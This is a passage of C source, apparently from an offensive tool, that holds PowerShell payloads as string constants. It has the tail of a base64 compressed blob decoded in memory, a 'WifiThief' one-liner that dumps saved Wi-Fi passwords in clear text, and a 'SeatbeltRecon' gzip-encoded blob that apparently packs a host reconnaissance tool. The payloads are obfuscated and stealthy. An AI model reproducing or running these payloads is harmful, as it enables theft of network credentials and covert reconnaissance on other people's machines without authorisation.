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')))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();\"";

const char WifiThief[] = "powershell -c \"(netsh wlan show profiles) | Select-String \\\"\\:(.+)$\\\" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=\\\"$name\\\" key=clear)}  | Select-String \\\"Key Content\\W+\\:(.+)$\\\" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize\"";

const char SeatbeltRecon[] = "powershell\n$b=\"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